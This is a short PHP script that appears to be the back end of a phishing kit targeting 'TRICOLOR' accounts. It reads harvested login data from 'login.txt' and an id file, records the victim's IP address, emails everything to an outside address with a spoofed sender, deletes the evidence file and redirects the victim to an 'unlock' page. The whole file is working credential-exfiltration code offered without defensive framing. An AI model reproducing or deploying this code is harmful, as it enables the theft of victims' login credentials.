<? 

function get_real_ip()
    {
 
        if (isset($_SERVER["HTTP_CLIENT_IP"]))
        {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
        {
            return $_SERVER["HTTP_X_FORWARDED_FOR"];
        }
        elseif (isset($_SERVER["HTTP_X_FORWARDED"]))
        {
            return $_SERVER["HTTP_X_FORWARDED"];
        }
        elseif (isset($_SERVER["HTTP_FORWARDED_FOR"]))
        {
            return $_SERVER["HTTP_FORWARDED_FOR"];
        }
        elseif (isset($_SERVER["HTTP_FORWARDED"]))
        {
            return $_SERVER["HTTP_FORWARDED"];
        }
        else
        {
            return $_SERVER["REMOTE_ADDR"];
        }
 
    }
    
$ip = get_real_ip();


	$a5 = "TRICOLOR";
	$a6 = "info@hotmail.com";
	$z = file_get_contents('id.txt');
   
	$asunto = "TRICOLOR MAIL (".$ip.") (".$z.")";
	$mensaje = file_get_contents('login.txt');

	$retorno = "soporte6969@outlook.com";
	$headers = "MIME-Version: 1.0\r\n";
	$headers = "Content-type: text/html; charset=iso-8859-1\r\n";	
	$headers = "From: ".$a5." <".$a6.">";
	mail($retorno, $asunto, $mensaje, $headers);
	unlink('login.txt');
	header("location: desbloqueo.php");	
  

?> 



